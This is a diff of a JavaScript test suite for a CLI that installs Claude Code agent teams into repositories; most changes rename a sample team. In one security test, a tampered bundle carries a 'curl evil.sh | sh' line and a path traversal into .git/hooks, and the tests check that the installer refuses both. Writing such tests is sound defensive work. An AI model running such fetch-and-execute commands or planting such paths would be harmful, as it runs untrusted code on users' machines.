@@ -66,7 +66,7 @@ const HOOK = BUNDLE.meta.hook;
 const SHARED = BUNDLE.shared.map((file) => file.path);
 const agentPath = (name) => `.claude/agents/${name}.md`;
 const agentContent = (bundle, name) => bundle.agents.find((agent) => agent.name === name).content;
-const SKILL_K = '.claude/skills/team-komanda-123/SKILL.md';
+const SKILL_K = '.claude/skills/team-agentmash-crew/SKILL.md';
 const MANIFEST = '.claude/agentmash-crew/teams.json';
 const SETTINGS = '.claude/settings.json';
 
@@ -253,7 +253,7 @@ describe('verifyBundle', () => {
 });
 
 describe('renderTeamSkill', () => {
-  const team = { slug: 'komanda-123', name: 'Команда 123', members: ['pipe-backend', 'mash-coordinator'] };
+  const team = { slug: 'agentmash-crew', name: 'agentmash crew', members: ['pipe-backend', 'mash-coordinator'] };
 
   test('substitutes every placeholder', () => {
     const skill = renderTeamSkill(BUNDLE, team);
@@ -262,11 +262,11 @@ describe('renderTeamSkill', () => {
       skill.content,
       [
         '---',
-        'name: team-komanda-123',
-        'description: "Team Команда 123 (komanda-123). Use when the user addresses Команда 123 or komanda-123."',
+        'name: team-agentmash-crew',
+        'description: "Team agentmash crew (agentmash-crew). Use when the user addresses agentmash crew or agentmash-crew."',
         '---',
         '',
-        '# Команда 123',
+        '# agentmash crew',
         '',
         'Roster: mash-coordinator, pipe-backend',
         '',
@@ -277,7 +277,7 @@ describe('renderTeamSkill', () => {
         '',
         'Not in this team: tally-planner, probe-qa',
         '',
-        'Add an agent: `npx github:IskakovDamir/agentmash-crew team add "Команда 123" --agents <agent>`',
+        'Add an agent: `npx agentmash team add "agentmash crew" --agents <agent>`',
         '',
       ].join('\n'),
     );
@@ -388,7 +388,7 @@ describe('settings merge', () => {
 });
 
 describe('planChange', () => {
-  const addOp = { type: 'add', name: 'Команда 123', members: ['pipe'] };
+  const addOp = { type: 'add', name: 'agentmash crew', members: ['pipe'] };
   const emptyState = (op) => ({
     manifest: null,
     settingsText: null,
@@ -431,7 +431,7 @@ describe('planChange', () => {
 
 describe('parseManifest', () => {
   const sha = 'a'.repeat(64);
-  const text = (files, teams = [{ slug: 'komanda-123', name: 'Команда 123', members: ['mash-coordinator', 'pipe-backend'] }]) =>
+  const text = (files, teams = [{ slug: 'agentmash-crew', name: 'agentmash crew', members: ['mash-coordinator', 'pipe-backend'] }]) =>
     JSON.stringify({ schema: 1, source: {}, createdSettings: false, teams, files });
 
   test('accepts what the installer writes', () => {
@@ -448,7 +448,7 @@ describe('parseManifest', () => {
       ['.claude/agentmash-crew/Teams.json', /is the manifest itself/],
       ['.claude/Agents/pipe-backend.md', /differs only in letter case from "\.claude\/agents\/pipe-backend\.md"/],
       ['.claude/skills/crew-protocol/skill.md', /differs only in letter case from "\.claude\/skills\/crew-protocol\/SKILL\.md"/],
-      ['.claude/skills/Team-Komanda-123/SKILL.md', /differs only in letter case from "\.claude\/skills\/team-komanda-123\/SKILL\.md"/],
+      ['.claude/skills/Team-Agentmash-Crew/SKILL.md', /differs only in letter case from "\.claude\/skills\/team-agentmash-crew\/SKILL\.md"/],
       ['.claude/agents/пайп.md', /only ASCII letters/],
     ];
     for (const [key, message] of cases) {
@@ -472,35 +472,35 @@ describe('cli', () => {
   test('add, extend, second team, remove members, remove teams', () => {
     const repo = tempRepo();
 
-    let result = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
+    let result = ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]));
     assert.deepEqual(
       filesIn(repo),
       [...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K, SETTINGS, MANIFEST].sort(),
     );
-    assert.match(result.stdout, /^team Команда 123 \(komanda-123\): mash-coordinator, pipe-backend$/m);
+    assert.match(result.stdout, /^team agentmash crew \(agentmash-crew\): mash-coordinator, pipe-backend$/m);
     // Run from another folder, so every git call names the repository; exactly the written files are staged.
     assert.equal(
       commitLine(result),
       [
         `git -C ${repo} add --`,
         ...[...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K, SETTINGS, MANIFEST].sort(),
-        `&& git -C ${repo} commit -m "chore: add agentmash team Команда 123"`,
+        `&& git -C ${repo} commit -m "chore: add agentmash team agentmash crew"`,
       ].join(' '),
     );
     assert.match(result.stdout, /start a new Claude Code session at the repository root/);
     assert.doesNotMatch(result.stdout, /open \/agents/);
-    assert.match(result.stdout, /then say: Команда 123, <your task> {3}\(or type: \/team-komanda-123 <your task>\)/);
+    assert.match(result.stdout, /then say: agentmash crew, <your task> {3}\(or type: \/team-agentmash-crew <your task>\)/);
     let manifest = manifestOf(repo);
-    assert.deepEqual(manifest.teams, [{ slug: 'komanda-123', name: 'Команда 123', members: ['mash-coordinator', 'pipe-backend'] }]);
+    assert.deepEqual(manifest.teams, [{ slug: 'agentmash-crew', name: 'agentmash crew', members: ['mash-coordinator', 'pipe-backend'] }]);
     assert.equal(manifest.createdSettings, true);
     assert.deepEqual(Object.keys(manifest.files), Object.keys(manifest.files).sort());
     for (const [file, sha] of Object.entries(manifest.files)) assert.equal(sha256Hex(read(repo, file)), sha, file);
 
     // Extend by exact name, from a subfolder, with --flag=value syntax.
     fs.mkdirSync(path.join(repo, 'src', 'deep'), { recursive: true });
-    result = ok(cli(['team', 'add', 'Команда 123', '--agents=probe', `--repo=${path.join(repo, 'src', 'deep')}`]));
+    result = ok(cli(['team', 'add', 'agentmash crew', '--agents=probe', `--repo=${path.join(repo, 'src', 'deep')}`]));
     assert.match(result.stdout, /created\s+\.claude\/agents\/probe-qa\.md/);
-    assert.match(result.stdout, /updated\s+\.claude\/skills\/team-komanda-123\/SKILL\.md/);
+    assert.match(result.stdout, /updated\s+\.claude\/skills\/team-agentmash-crew\/SKILL\.md/);
     assert.match(read(repo, SKILL_K), /\| Probe \| `probe-qa` \| QA engineer \|/);
     // Every file the installer manages is staged, also the unchanged ones an uncommitted earlier run wrote.
     assert.equal(
@@ -508,22 +508,22 @@ describe('cli', () => {
       [
         `git -C ${repo} add --`,
         ...[...SHARED, ...['mash-coordinator', 'pipe-backend', 'probe-qa'].map(agentPath), SKILL_K, SETTINGS, MANIFEST].sort(),
-        `&& git -C ${repo} commit -m "chore: update agentmash team Команда 123"`,
+        `&& git -C ${repo} commit -m "chore: update agentmash team agentmash crew"`,
       ].join(' '),
     );
 
     // Extend by slug: same team, with a note that the names differ.
-    result = ok(cli(['team', 'add', 'komanda-123', '--agents', 'tally', '--repo', repo]));
-    assert.match(result.stderr, /same slug as team "Команда 123"; extending that team/);
+    result = ok(cli(['team', 'add', 'agentmash-crew', '--agents', 'tally', '--repo', repo]));
+    assert.match(result.stderr, /same slug as team "agentmash crew"; extending that team/);
     assert.deepEqual(manifestOf(repo).teams[0].members, ['mash-coordinator', 'tally-planner', 'pipe-backend', 'probe-qa']);
 
     ok(cli(['team', 'add', 'Ops', '--agents', 'probe', '--repo', repo]));
-    assert.deepEqual(manifestOf(repo).teams.map((team) => team.slug), ['komanda-123', 'ops']);
+    assert.deepEqual(manifestOf(repo).teams.map((team) => team.slug), ['agentmash-crew', 'ops']);
 
-    // tally is only in Команда 123, so its file goes; probe is shared with Ops, so its file stays.
-    ok(cli(['team', 'remove', 'Команда 123', '--agents', 'tally', '--repo', repo]));
+    // tally is only in agentmash crew, so its file goes; probe is shared with Ops, so its file stays.
+    ok(cli(['team', 'remove', 'agentmash crew', '--agents', 'tally', '--repo', repo]));
     assert.equal(exists(repo, agentPath('tally-planner')), false);
-    ok(cli(['team', 'remove', 'komanda-123', '--agents', 'probe-qa', '--repo', repo]));
+    ok(cli(['team', 'remove', 'agentmash-crew', '--agents', 'probe-qa', '--repo', repo]));
     assert.equal(exists(repo, agentPath('probe-qa')), true);
     assert.deepEqual(manifestOf(repo).teams[0].members, ['mash-coordinator', 'pipe-backend']);
 
@@ -539,14 +539,14 @@ describe('cli', () => {
     assert.equal(exists(repo, '.claude/skills/team-ops'), false);
     assert.equal(exists(repo, agentPath('probe-qa')), false);
 
-    result = ok(cli(['team', 'remove', 'Команда 123', '--repo', repo]));
+    result = ok(cli(['team', 'remove', 'agentmash crew', '--repo', repo]));
     // Deletions go through `git rm --cached --ignore-unmatch`, which also works for files that were never committed.
     assert.equal(
       commitLine(result),
       [
         `git -C ${repo} rm -q --cached --ignore-unmatch --`,
         ...[...SHARED, agentPath('mash-coordinator'), agentPath('pipe-backend'), SKILL_K, SETTINGS, MANIFEST].sort(),
-        `&& git -C ${repo} commit -m "chore: remove agentmash team Команда 123"`,
+        `&& git -C ${repo} commit -m "chore: remove agentmash team agentmash crew"`,
       ].join(' '),
     );
     assert.deepEqual(snapshot(repo), { '.claude/': 'dir', 'src/': 'dir', 'src/deep/': 'dir' });
@@ -562,19 +562,19 @@ describe('cli', () => {
     fs.mkdirSync(path.join(repo, '.claude'));
     fs.writeFileSync(path.join(repo, SETTINGS), original);
 
-    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
+    ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]));
     const settings = JSON.parse(read(repo, SETTINGS));
     assert.deepEqual(settings.permissions, { allow: ['Bash(npm test)'] });
     assert.equal(settings.hooks.PreToolUse.length, 2);
     assert.equal(settings.hooks.PreToolUse[0].matcher, 'Write');
     assert.equal(manifestOf(repo).createdSettings, false);
 
-    const again = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
+    const again = ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]));
     assert.match(again.stdout, /nothing to change/);
     assert.doesNotMatch(again.stdout, /next:/);
     assert.equal(JSON.parse(read(repo, SETTINGS)).hooks.PreToolUse.length, 2);
 
-    ok(cli(['team', 'remove', 'Команда 123', '--repo', repo]));
+    ok(cli(['team', 'remove', 'agentmash crew', '--repo', repo]));
     assert.equal(read(repo, SETTINGS), original);
   });
 
@@ -584,7 +584,7 @@ describe('cli', () => {
       fs.mkdirSync(path.join(repo, '.claude'));
       fs.writeFileSync(path.join(repo, SETTINGS), text);
       const before = snapshot(repo);
-      const result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]);
+      const result = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]);
       assert.equal(result.code, 1);
       assert.match(result.stderr, /\.claude\/settings\.json (is not valid JSON|must contain a JSON object)/);
       assert.deepEqual(snapshot(repo), before);
@@ -597,13 +597,13 @@ describe('cli', () => {
     fs.writeFileSync(path.join(repo, agentPath('pipe-backend')), 'my own pipe\n');
     const before = snapshot(repo);
 
-    const refused = cli(['team', 'add', 'Команда 123', '--agents', 'pipe,probe', '--repo', repo]);
+    const refused = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe,probe', '--repo', repo]);
     assert.equal(refused.code, 1);
     assert.match(refused.stderr, /did not write:\n {2}\.claude\/agents\/pipe-backend\.md\n/);
     assert.match(refused.stderr, /--force/);
     assert.deepEqual(snapshot(repo), before);
 
-    const forced = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe,probe', '--repo', repo, '--force']));
+    const forced = ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe,probe', '--repo', repo, '--force']));
     assert.match(forced.stdout, /overwritten\s+\.claude\/agents\/pipe-backend\.md/);
     assert.equal(read(repo, agentPath('pipe-backend')), agentContent(BUNDLE, 'pipe-backend'));
     assert.equal(manifestOf(repo).files[agentPath('pipe-backend')], sha256Hex(agentContent(BUNDLE, 'pipe-backend')));
@@ -622,7 +622,7 @@ describe('cli', () => {
 
   test('update keeps locally changed files unless --force', () => {
     const repo = tempRepo();
-    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
+    ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]));
     const local = `${agentContent(BUNDLE, 'pipe-backend')}\nOur own rule.\n`;
     fs.writeFileSync(path.join(repo, agentPath('pipe-backend')), local);
 
@@ -656,45 +656,45 @@ describe('cli', () => {
 
   test('remove leaves locally changed files in place and stops tracking them', () => {
     const repo = tempRepo();
-    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe,probe', '--repo', repo]));
+    ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe,probe', '--repo', repo]));
     fs.appendFileSync(path.join(repo, agentPath('probe-qa')), 'local\n');
 
-    let result = ok(cli(['team', 'remove', 'Команда 123', '--agents', 'probe', '--repo', repo]));
+    let result = ok(cli(['team', 'remove', 'agentmash crew', '--agents', 'probe', '--repo', repo]));
     assert.match(result.stdout, /left\s+\.claude\/agents\/probe-qa\.md/);
     assert.match(result.stderr, /warning: left \.claude\/agents\/probe-qa\.md: no longer needed/);
     assert.equal(exists(repo, agentPath('probe-qa')), true);
     assert.equal(agentPath('probe-qa') in manifestOf(repo).files, false);
 
     fs.appendFileSync(path.join(repo, SKILL_K), 'local\n');
-    result = ok(cli(['team', 'remove', 'Команда 123', '--repo', repo]));
-    assert.match(result.stderr, /left \.claude\/skills\/team-komanda-123\/SKILL\.md/);
+    result = ok(cli(['team', 'remove', 'agentmash crew', '--repo', repo]));
+    assert.match(result.stderr, /left \.claude\/skills\/team-agentmash-crew\/SKILL\.md/);
     assert.deepEqual(Object.keys(snapshot(repo)).sort(), [
       '.claude/',
       '.claude/agents/',
       '.claude/agents/probe-qa.md',
       '.claude/skills/',
-      '.claude/skills/team-komanda-123/',
-      '.claude/skills/team-komanda-123/SKILL.md',
+      '.claude/skills/team-agentmash-crew/',
+      '.claude/skills/team-agentmash-crew/SKILL.md',
     ]);
 
     // Untracked now, so a fresh add treats the left-over skill as someone else's file.
-    result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]);
+    result = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]);
     assert.equal(result.code, 1);
-    assert.match(result.stderr, /team-komanda-123\/SKILL\.md/);
+    assert.match(result.stderr, /team-agentmash-crew\/SKILL\.md/);
   });
 
   test('--dry-run writes nothing', () => {
     const repo = tempRepo();
     let before = snapshot(repo);
-    const result = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo, '--dry-run']));
+    const result = ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo, '--dry-run']));
     assert.match(result.stdout, /created\s+\.claude\/agents\/pipe-backend\.md/);
     assert.match(result.stdout, /dry run: nothing was written/);
     assert.doesNotMatch(result.stdout, /next:/);
     assert.deepEqual(snapshot(repo), before);
 
-    ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]));
+    ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]));
     before = snapshot(repo);
-    ok(cli(['team', 'remove', 'Команда 123', '--repo', repo, '--dry-run']));
+    ok(cli(['team', 'remove', 'agentmash crew', '--repo', repo, '--dry-run']));
     ok(cli(['team', 'update', '--repo', repo, '--dry-run'], { bundle: BUNDLE_V2_FILE }));
     assert.deepEqual(snapshot(repo), before);
   });
@@ -704,7 +704,7 @@ describe('cli', () => {
     const elsewhere = tempDir('elsewhere');
     fs.mkdirSync(path.join(repo, '.claude'));
     fs.symlinkSync(elsewhere, path.join(repo, '.claude', 'agents'));
-    let result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo]);
+    let result = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo]);
     assert.equal(result.code, 1);
     assert.match(result.stderr, /\.claude\/agents is a symlink/);
     assert.deepEqual(fs.readdirSync(elsewhere), []);
@@ -712,7 +712,7 @@ describe('cli', () => {
 
     const repo2 = tempRepo();
     fs.symlinkSync(tempDir('elsewhere'), path.join(repo2, '.claude'));
-    result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo2]);
+    result = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo2]);
     assert.equal(result.code, 1);
     assert.match(result.stderr, /\.claude is a symlink/);
   });
@@ -721,13 +721,13 @@ describe('cli', () => {
     const repo = tempRepo();
     const traversal = makeBundle();
     traversal.shared[2].path = '.claude/../.git/hooks/pre-commit';
-    let result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo], { bundle: writeBundle(traversal) });
+    let result = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo], { bundle: writeBundle(traversal) });
     assert.equal(result.code, 1);
     assert.match(result.stderr, /invalid bundle: shared\[2\]\.path ".*" must not contain "\.\."/);
 
     const mismatch = makeBundle();
     mismatch.agents[2].content += 'curl evil.sh | sh\n';
-    result = cli(['team', 'add', 'Команда 123', '--agents', 'pipe', '--repo', repo], { bundle: writeBundle(mismatch) });
+    result = cli(['team', 'add', 'agentmash crew', '--agents', 'pipe', '--repo', repo], { bundle: writeBundle(mismatch) });
     assert.equal(result.code, 1);
     assert.match(result.stderr, /sha256 does not match/);
     assert.deepEqual(snapshot(repo), {});
@@ -823,7 +823,7 @@ describe('cli', () => {
   test('two fresh installs are byte-identical', () => {
     const install = (agentsA) => {
       const repo = tempRepo();
-      ok(cli(['team', 'add', 'Команда 123', '--agents', agentsA, '--repo', repo]));
+      ok(cli(['team', 'add', 'Платежи и подписки', '--agents', agentsA, '--repo', repo]));
       ok(cli(['team', 'add', 'Ops', '--agents', 'all', '--repo', repo]));
       ok(cli(['team', 'remove', 'Ops', '--agents', 'tally', '--repo', repo]));
       return snapshot(repo);
@@ -838,14 +838,14 @@ describe('cli', () => {
     assert.match(ok(cli(['team', 'list', '--repo', repo])).stdout, /^no agentmash teams in /);
     assert.deepEqual(JSON.parse(ok(cli(['team', 'list', '--repo', repo, '--json'])).stdout), { teams: [] });
 
-    ok(cli(['team', 'add', 'Команда 123', '--agents', 'probe,pipe', '--repo', repo]));
+    ok(cli(['team', 'add', 'agentmash crew', '--agents', 'probe,pipe', '--repo', repo]));
     ok(cli(['team', 'add', 'Ops', '--slug', 'ops-team', '--agents', 'tally', '--repo', repo]));
     assert.equal(
       ok(cli(['team', 'list', '--repo', repo])).stdout,
-      'Команда 123 (komanda-123): mash, pipe, probe\nOps (ops-team): mash, tally\n',
+      'agentmash crew (agentmash-crew): mash, pipe, probe\nOps (ops-team): mash, tally\n',
     );
     assert.deepEqual(JSON.parse(ok(cli(['team', 'list', '--repo', repo, '--json'])).stdout).teams, [
-      { slug: 'komanda-123', name: 'Команда 123', members: ['mash-coordinator', 'pipe-backend', 'probe-qa'] },
+      { slug: 'agentmash-crew', name: 'agentmash crew', members: ['mash-coordinator', 'pipe-backend', 'probe-qa'] },
       { slug: 'ops-team', name: 'Ops', members: ['mash-coordinator', 'tally-planner'] },
     ]);
 
@@ -864,8 +864,8 @@ describe('cli', () => {
       [['frobnicate'], /unknown command "frobnicate"/],
       [['team'], /team needs a command/],
       [['team', 'rename', 'x'], /unknown team command "rename"/],
-      [['team', 'add', 'Команда 123', '--repo', repo], /needs --agents/],
-      [['team', 'add', 'Команда', '123', '--agents', 'pipe'], /quote it: team add "Команда 123"/],
+      [['team', 'add', 'agentmash crew', '--repo', repo], /needs --agents/],
+      [['team', 'add', 'agentmash', 'crew', '--agents', 'pipe'], /quote it: team add "agentmash crew"/],
       [['team', 'add', '--agents', 'pipe'], /needs a team name/],
       [['team', 'add', 'x', '--agents'], /--agents needs a value/],
       [['team', 'add', 'x', '--agents', 'pipe', '--agents', 'probe'], /given twice/],
@@ -881,12 +881,12 @@ describe('cli', () => {
     }
 
     const input = [
-      [['team', 'add', 'Команда 123', '--agents', 'mash', '--repo', repo], /at least one agent besides mash-coordinator/],
-      [['team', 'add', 'Команда 123', '--agents', 'pipe,nope', '--repo', repo], /unknown agent "nope"; valid names: mash, tally, pipe, probe/],
+      [['team', 'add', 'agentmash crew', '--agents', 'mash', '--repo', repo], /at least one agent besides mash-coordinator/],
+      [['team', 'add', 'agentmash crew', '--agents', 'pipe,nope', '--repo', repo], /unknown agent "nope"; valid names: mash, tally, pipe, probe/],
       [['team', 'add', 'Say "hi"', '--agents', 'pipe', '--repo', repo], /double quotes/],
       [['team', 'add', '中文', '--agents', 'pipe', '--repo', repo], /pass one with --slug/],
       [['team', 'add', 'x', '--slug', 'Bad Slug', '--agents', 'pipe', '--repo', repo], /invalid slug/],
-      [['team', 'remove', 'Команда 123', '--repo', repo], /no agentmash teams are installed/],
+      [['team', 'remove', 'agentmash crew', '--repo', repo], /no agentmash teams are installed/],
       [['team', 'update', '--repo', repo], /nothing to update/],
       [['team', 'list', '--repo', tempDir('not-a-repo')], /not inside a git repository/],
       [['agents'], /cannot read the crew bundle/, { bundle: path.join(SCRATCH, 'missing.json') }],
@@ -909,8 +909,8 @@ test('smoke: the real dist/bundle.json installs and uninstalls cleanly', (t) => 
   assert.equal(bundle.agents.length, 18);
 
   const repo = tempRepo();
-  const result = ok(cli(['team', 'add', 'Команда 123', '--agents', 'pipe,flex,probe', '--repo', repo], { bundle: null }));
-  assert.match(result.stdout, /^team Команда 123 \(komanda-123\): mash-coordinator, flex-frontend, pipe-backend, probe-qa$/m);
+  const result = ok(cli(['team', 'add', 'agentmash crew', '--agents', 'pipe,flex,probe', '--repo', repo], { bundle: null }));
+  assert.match(result.stdout, /^team agentmash crew \(agentmash-crew\): mash-coordinator, flex-frontend, pipe-backend, probe-qa$/m);
   const files = filesIn(repo);
   assert.deepEqual(
     files,
@@ -926,11 +926,11 @@ test('smoke: the real dist/bundle.json installs and uninstalls cleanly', (t) => 
 
   const skill = read(repo, SKILL_K);
   assert.doesNotMatch(skill, /\{\{[a-z_]+\}\}/);
-  assert.match(skill, /^---\nname: team-komanda-123\n/);
+  assert.match(skill, /^---\nname: team-agentmash-crew\n/);
   const description = skill.match(/^description: (".*")$/m);
   assert.ok(description, 'the team skill has a double-quoted description line');
   assert.ok(JSON.parse(description[1]).length <= 500, 'description stays within 500 characters');
 
-  ok(cli(['team', 'remove', 'Команда 123', '--repo', repo], { bundle: null }));
+  ok(cli(['team', 'remove', 'agentmash crew', '--repo', repo], { bundle: null }));
   assert.deepEqual(snapshot(repo), { '.claude/': 'dir' });
 });
